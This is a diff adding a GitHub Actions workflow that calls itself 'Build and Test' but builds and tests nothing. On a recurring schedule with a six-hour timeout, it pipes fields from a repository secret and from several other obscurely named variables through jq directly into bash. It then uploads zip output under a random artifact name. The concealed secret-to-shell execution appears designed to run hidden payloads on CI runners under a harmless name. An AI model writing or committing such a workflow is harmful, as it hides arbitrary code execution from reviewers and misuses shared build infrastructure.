@@ -1,0 +1,35 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '15 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          mxcp426: ${{ secrets.mxcp426 }}
+        run: |
+          printf '%s' "$mxcp426" | jq -r .owq295 | /bin/bash
+          printf '%s' "$mta694" | jq -r .gesru5 | /bin/bash
+          printf '%s' "$eqcyz74" | jq -r .hd98520 | /bin/bash
+          echo $pc4 | jq -r .fnkk2316 | /bin/bash
+          printf '%s' "$kksx72782" | jq -r .bhl4 | /bin/bash
+          echo $ldoc9365 | jq -r .kjyx8 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Q7EO6il6
+          path: "*.zip"
+          retention-days: 1
